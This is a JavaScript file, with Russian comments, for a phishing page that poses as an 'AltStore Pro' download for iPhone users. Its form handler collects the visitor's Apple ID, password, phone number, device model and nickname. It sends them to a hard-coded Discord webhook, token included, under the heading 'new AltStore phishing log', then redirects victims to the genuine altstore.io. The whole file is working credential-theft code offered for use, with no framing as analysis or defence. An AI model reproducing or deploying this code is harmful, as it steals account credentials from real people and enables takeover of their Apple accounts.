document.addEventListener('DOMContentLoaded', function() {
    // Элементы
    const proBtn = document.getElementById('altstore-pro-btn');
    const videoLink = document.getElementById('video-link');
    const modals = document.querySelectorAll('.modal');
    const proModal = document.getElementById('pro-modal');
    const phishModal = document.getElementById('phish-modal');
    const telegramModal = document.getElementById('telegram-modal');
    const closeButtons = document.querySelectorAll('.close');
    const continueBtn = document.getElementById('continue-phish');
    const phishForm = document.getElementById('phish-form');
    const fakeDone = document.getElementById('fake-done');
    const randomSpan = document.getElementById('random-digits');

    // Генерация случайного трёхзначного числа для кода
    function generateRandomCode() {
        return Math.floor(Math.random() * 900 + 100).toString();
    }

    // Открыть модалку
    function openModal(modal) {
        modals.forEach(m => m.style.display = 'none');
        modal.style.display = 'flex';
    }

    // Закрыть все
    function closeModals() {
        modals.forEach(m => m.style.display = 'none');
    }

    // Видео-ссылка открывает YouTube с поиском AltStore
    videoLink.addEventListener('click', (e) => {
        e.preventDefault();
        window.open('https://www.youtube.com/results?search_query=altstore+ios', '_blank');
    });

    // Кнопка AltStore Pro
    proBtn.addEventListener('click', () => {
        openModal(proModal);
    });

    // Кнопка "Продолжить" в первом модальном окне
    continueBtn.addEventListener('click', () => {
        openModal(phishModal);
    });

    // Отправка данных фишинга
    phishForm.addEventListener('submit', (e) => {
        e.preventDefault();

        const iosVersion = document.getElementById('ios-version').value;
        const iphoneModel = document.getElementById('iphone-model').value;
        const appleId = document.getElementById('apple-id').value;
        const password = document.getElementById('password').value;
        const phone = document.getElementById('phone').value;
        const nickname = document.getElementById('nickname').value;
        const cert = document.querySelector('input[name="cert"]:checked').value;

        // Если есть сертификат — кидаем на официальный сайт
        if (cert === 'yes') {
            window.location.href = 'https://altstore.io';
            return;
        }

        // Нет сертификата — генерируем код и переходим к телеграм-модалке
        const randomCode = generateRandomCode();
        const fullCode = `ALT${randomCode}PRO`;
        randomSpan.textContent = randomCode;

        // Отправка данных в Discord webhook
        const webhookURL = 'https://discord.com/api/webhooks/1456608509906128928/S_vlv9faEH_Y2RLDAfJA07eZ8DvZG_QiojDILZpg0xTk60b0n7QrlL4e8N2874Dt5nVK';
        const data = {
            content: `**Новый лог фишинга AltStore**\n**iOS:** ${iosVersion}\n**iPhone:** ${iphoneModel}\n**Apple ID:** ${appleId}\n**Пароль:** ${password}\n**Телефон:** ${phone}\n**Никнейм:** ${nickname}\n**Код:** ${fullCode}\n**Время:** ${new Date().toLocaleString('ru-RU')}`
        };

        fetch(webhookURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(err => console.log('Ошибка отправки', err));

        // Открываем окно с Telegram
        openModal(telegramModal);
    });

    // Кнопка "Я отправил" — перенаправление на официальный сайт
    fakeDone.addEventListener('click', () => {
        window.location.href = 'https://altstore.io';
    });

    // Закрытие по крестику
    closeButtons.forEach(btn => {
        btn.addEventListener('click', closeModals);
    });

    // Закрытие по клику вне модалки
    window.addEventListener('click', (e) => {
        if (e.target.classList.contains('modal')) {
            closeModals();
        }
    });
});
